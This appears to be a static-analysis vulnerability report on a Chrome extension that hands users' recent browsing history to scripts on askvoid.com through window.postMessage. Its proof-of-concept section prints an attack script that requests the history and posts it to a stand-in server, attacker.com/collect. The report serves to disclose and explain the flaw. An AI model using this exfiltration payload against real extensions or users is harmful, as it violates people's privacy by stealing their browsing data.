# CoCo Analysis: mfgnpbldopkbgphddaifenkolikoepbe

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 8 (all related to same vulnerability - different fields of HistoryItem)

---

## Sink: HistoryItem_source → window_postMessage_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mfgnpbldopkbgphddaifenkolikoepbe/opgen_generated_files/bg.js
Line 775-783: HistoryItem object with fields (id, lastVisitTime, title, typedCount, url, visitCount)

Note: CoCo detected flow in framework mock code. The actual vulnerability exists in original extension code.
```

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
const n = ["https://askvoid.com"];
window.addEventListener("message", function(e) {
    if (!(e.source !== window || !n.includes(e.data.origin)) &&
        e.data.target === "ASKVOID_EXTENSION") {

        switch(e.data.type) {
            case "GET_VERSION": {
                const {version: t, name: s} = chrome.runtime.getManifest();
                window.postMessage({
                    type: "GET_VERSION",
                    version: t,
                    name: s
                }, e.data.origin);
                break;
            }
            case "GET_HISTORY": {
                // Request history from background
                chrome.runtime.sendMessage({type: "GET_HISTORY"}, t => {
                    // Post history data back to webpage
                    window.postMessage({
                        type: "GET_HISTORY",
                        data: t // ← sensitive user history data
                    }, e.data.origin);
                });
                break;
            }
        }
    }
});

// Background script (bg.js) - Message handler
const n = (e, r, s) =>
    e.type ?
        e.type === "GET_HISTORY" ? (
            chrome.history.search({text: "", maxResults: 10}, function(t) {
                s(t); // ← returns user browsing history
            }),
            !0
        ) : !1
    : !1;

chrome.runtime.onMessage.addListener(n);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from content script

**Attack:**

```javascript
// On https://askvoid.com/* pages, an attacker can inject:
window.postMessage({
    origin: "https://askvoid.com",
    target: "ASKVOID_EXTENSION",
    type: "GET_HISTORY"
}, "*");

// Listen for the response containing user history
window.addEventListener("message", function(event) {
    if (event.data.type === "GET_HISTORY") {
        console.log("User's browsing history:", event.data.data);
        // event.data.data contains array of HistoryItems with:
        // - id, url, title, visitCount, typedCount, lastVisitTime

        // Exfiltrate to attacker server
        fetch("https://attacker.com/collect", {
            method: "POST",
            body: JSON.stringify(event.data.data)
        });
    }
});
```

**Impact:** An attacker who controls content on https://askvoid.com (via XSS or site compromise) can exfiltrate the user's browsing history. The extension returns up to 10 recent history items containing URLs, page titles, visit counts, and timestamps. This constitutes a serious privacy violation, exposing user browsing habits and potentially sensitive information about visited websites.

---

**Note:** CoCo detected 8 separate flows for individual fields (id, lastVisitTime, title, typedCount, url, visitCount, the HistoryItem object, and the HistoryItem array), but they all represent the same underlying vulnerability - the leakage of browsing history data through window.postMessage.
